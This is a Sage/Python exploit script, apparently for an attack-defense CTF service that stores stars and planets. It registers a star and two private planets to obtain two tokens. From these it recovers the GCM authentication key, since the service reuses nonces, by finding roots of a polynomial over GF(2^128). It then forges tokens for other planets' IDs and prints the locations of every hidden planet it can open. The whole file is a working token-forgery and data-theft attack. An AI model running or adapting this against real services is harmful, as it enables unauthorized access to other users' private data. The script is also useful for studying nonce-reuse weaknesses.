#!/usr/bin/env sage3

import sys
import struct
import base64
import string
import urllib
import random
import hashlib
import requests

from typing import List, Dict, Tuple


IP = sys.argv[1]
PORT = 17171
URL = f'http://{IP}:{PORT}'


size = 128
F.<z> = GF(2^size)
P.<X> = PolynomialRing(F)


def random_string(length: int=32):
    return ''.join(random.sample(string.ascii_letters, length))


def get_last_stars() -> Dict:
    return requests.get(f'{URL}/api/stars/').json()


def get_star(star_id: str) -> Dict:
    return requests.get(f'{URL}/api/stars/{star_id}').json()


def get_planet(planet_id: str, token: str='') -> Dict:
    return requests.get(f'{URL}/api/planets/{planet_id}', cookies={'token': token}).json()


def add_star() -> Tuple:
    star = {
        'name': random_string(),
        'location': random_string()
    }
    response = requests.post(f'{URL}/api/stars/', json=star)
    return response.cookies.get('token', ''), response.json()


def add_planet(star_id: str, token: str, private: bool=False) -> Tuple:
    planet = {
        'starId': star_id,
        'name': random_string(),
        'location': random_string(),
        'planetType': random.randint(1, 3),
        'isHidden': private
    }
    response = requests.post(f'{URL}/api/planets/', json=planet, cookies={'token': token})
    return response.cookies.get('token', ''), response.json()


def parse_token(token: str) -> Tuple:
    token_data = base64.b64decode(urllib.parse.unquote_plus(token))
    dataLength, ownerLength, checksumLength = struct.unpack('<III', token_data[:12])
    return (
        token_data[12:12+dataLength], 
        token_data[12+dataLength:12+dataLength+ownerLength],
        token_data[12+dataLength+ownerLength:12+dataLength+ownerLength+checksumLength]
    )


def build_token(data: bytes, owner: bytes, checksum: bytes) -> str:
    lengths = struct.pack('<III', len(data), len(owner), len(checksum))
    return urllib.parse.quote_plus(base64.b64encode(lengths + data + owner + checksum))


def xor(b1: bytes, b2: bytes) -> bytes:
    return bytes(x^^y for x, y in zip(b1, b2))


def md5(x: str) -> str:
    return hashlib.md5(x.encode()).hexdigest()


def int_to_block(x: int) -> bytes:
    return int(x).to_bytes(16, 'big')


def block_to_int(x: bytes) -> int:
    return int.from_bytes(x, 'big')


def int_to_poly(x: int):
    return sum(int(b) * z^i for i, b in enumerate(bin(x)[2:].rjust(size, '0')))


def poly_to_int(poly):
    x = 0
    for i, b in enumerate(poly._vector_()):
        x |= int(b) << (127 - i)
    return x


def split_bytes_to_blocks(x: bytes) -> List:
    x += b'\x00' * ((16 - len(x) % 16) % 16)
    return [x[i:i+16] for i in range(0, len(x), 16)]


def bytes_to_poly(x: bytes):
    return list(map(int_to_poly, map(block_to_int, split_bytes_to_blocks(x))))


def build_polynomial(data: bytes, owner: bytes, checksum: bytes):
    length = int_to_block(8 * ((len(owner) << 64) | len(data)))
    elements = sum(map(bytes_to_poly, [owner, data, length, checksum]), [])
    return sum(element * X^i for i, element in enumerate(reversed(elements)))


def get_token_generator(planet_id1: str, token1: str, token2: str):
    data1, owner1, checksum1 = parse_token(token1)
    data2, owner2, checksum2 = parse_token(token2)

    f1 = build_polynomial(data1, owner1, checksum1)
    f2 = build_polynomial(data2, owner2, checksum2)

    def generate(required_planet_id: str):
        data = xor(data1, xor(
            f'["{md5(planet_id1)}"]'.encode(), 
            f'["{md5(required_planet_id)}"]'.encode()))

        f = build_polynomial(data, owner1, b'') * X

        for root in (f1 + f2).roots():
            checksum = int_to_block(poly_to_int((f + f1)(root[0])))
            yield build_token(data, owner1, checksum)

    return generate


def main():
    token, star = add_star()
    token1, planet1 = add_planet(star['id'], token, True)
    token2, planet2 = add_planet(star['id'], token, True)
    
    generate = get_token_generator(planet1['id'], token1, token2)

    # TODO: use attack_data
    
    for star in get_last_stars():
        for planet_id in star['planets']:
            for fake_token in generate(planet_id):
                planet = get_planet(planet_id, fake_token)
                if 'error' not in planet and planet['isHidden'] == True:
                    # print(planet)
                    print(planet['location'])
                    break


if __name__ == '__main__':
    main()
